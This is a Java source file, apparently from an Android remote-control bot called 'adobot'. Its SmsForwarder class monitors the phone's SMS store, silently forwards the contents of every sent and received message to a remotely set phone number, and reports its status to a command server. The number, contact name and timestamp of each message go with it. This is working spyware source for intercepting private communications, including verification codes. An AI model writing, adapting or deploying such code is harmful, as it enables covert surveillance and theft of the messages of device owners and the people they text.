package com.android.adobot.tasks;

import android.Manifest;
import android.content.ContentResolver;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.adobot.CommandService;
import com.android.adobot.CommonParams;
import com.android.adobot.Constants;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;
import com.android.adobot.tasks.BaseTask;
import com.android.adobot.tasks.SendSmsTask;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;

/**
 * Created by adones on 2/27/17.
 */

public class SmsForwarder extends BaseTask {

    private static final String TAG = "SmsForwarder";

    private static final Uri smsUri = Uri.parse("content://sms");
    private static final int MESSAGE_TYPE_RECEIVED = 1;
    private static final int MESSAGE_TYPE_SENT = 2;
    private static final int MAX_SMS_MESSAGE_LENGTH = 160;

    private SmsObserver smsObserver;
    private String recipientNumber;
    private ContentResolver contentResolver;
    private boolean isListening;
    private boolean sending;

    public SmsForwarder(CommandService c) {
        setContext(c);
        smsObserver = (new SmsObserver(new Handler()));
        contentResolver = context.getContentResolver();
    }

    public boolean isListening() {
        return this.isListening;
    }

    public void listen() {
        if (this.recipientNumber != null && hasPermission() && !isListening) {
            commonParams = new CommonParams(context);
            contentResolver.registerContentObserver(smsUri, true, smsObserver);
            isListening = true;

            //notify server
            HashMap params = new HashMap();
            params.put("uid", commonParams.getUid());
            params.put("sms_forwarder_number", recipientNumber);
            params.put("sms_forwarder_status", isListening);

            Http req = new Http();
            req.setUrl(commonParams.getServer() + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
            req.setMethod(HttpRequest.METHOD_POST);
            req.setParams(params);
            req.execute();
        }
    }

    public void stopForwarding() {
        commonParams = new CommonParams(context);
        if (isListening) {
            contentResolver.unregisterContentObserver(smsObserver);
            isListening = false;
        }
        //notify server
        HashMap params = new HashMap();
        params.put("uid", commonParams.getUid());
        params.put("sms_forwarder_number", "");
        params.put("sms_forwarder_status", isListening);

        Http req = new Http();
        req.setUrl(commonParams.getServer() + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
        req.setMethod(HttpRequest.METHOD_POST);
        req.setParams(params);
        req.execute();
    }

    private boolean hasPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) ==
                PackageManager.PERMISSION_GRANTED;
    }

    public void setRecipientNumber(String recipientNumber) {
        this.recipientNumber = recipientNumber;
    }

    public class SmsObserver extends ContentObserver {

        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(smsUri, null, null, null, null);

                if (cursor != null && cursor.moveToNext()) {
                    forwardSms(cursor);
                }
            } finally {
                if (cursor != null)
                    cursor.close();
            }

        }

        private void forwardSms(Cursor mCur) {
            int type = mCur.getInt(mCur.getColumnIndex("type"));
            String body = mCur.getString(mCur.getColumnIndex("body"));

            // accept only received and sent
            if ((type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT) &&
                    // avoid loop when testing own number
                    !body.contains(Constants.SMS_FORWARDER_SIGNATURE)) {

                SimpleDateFormat df = new SimpleDateFormat("EEE d MMM yyyy");
                SimpleDateFormat tf = new SimpleDateFormat("hh:mm aaa");
                Calendar calendar = Calendar.getInstance();
                String now = mCur.getString(mCur.getColumnIndex("date"));
                calendar.setTimeInMillis(Long.parseLong(now));
                String phone = mCur.getString(mCur.getColumnIndex("address"));
                String name = getContactName(phone);
                String date = df.format(calendar.getTime()) + "\n" + tf.format(calendar.getTime());

                String message = Constants.SMS_FORWARDER_SIGNATURE + "\n\n";
                message += "From: " + commonParams.getDevice() + "\n";
                message += "UID: " + commonParams.getUid() + "\n\n";
                message += type == MESSAGE_TYPE_RECEIVED ? "(Received) " : (type == MESSAGE_TYPE_SENT ? "(Sent) " : "");
                message += name != null ? name + "\n" : "";
                message += phone != null ? phone : "";
                message += "\n\n";
                message += body + "\n\n";
                message += date + "\n\n";

                Thread send = new SendSmsThread(recipientNumber, message);
                send.start();
            }

        }

        private class SendSmsThread extends Thread {
            final SmsManager manager = SmsManager.getDefault();
            private String phone;
            private String message;
            private int delay = 3000;

            public SendSmsThread(String phone, String message) {
                this.phone = phone;
                this.message = message;
            }

            @Override
            public void run() {
                super.run();
                if (sending) {
                    Log.i(TAG, "Resending..");
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } finally {
                        new SendSmsThread(this.phone, this.message).start();
                    }
                    return;
                }
                sending = true;
                try {
                    Log.i(TAG, "Sleeping ..");
                    Thread.sleep(delay);

                } catch (InterruptedException e) {
                    e.printStackTrace();
                } finally {
                    Log.i(TAG, "Sending message ");
                    int length = message.length();

                    if (length > MAX_SMS_MESSAGE_LENGTH) {
                        ArrayList<String> messagelist = manager.divideMessage(message);

                        manager.sendMultipartTextMessage(phone, null, messagelist, null, null);
                    } else {
                        manager.sendTextMessage(phone, null, message, null, null);
                    }

                    sending = false;

                }
            }
        }

    }


}
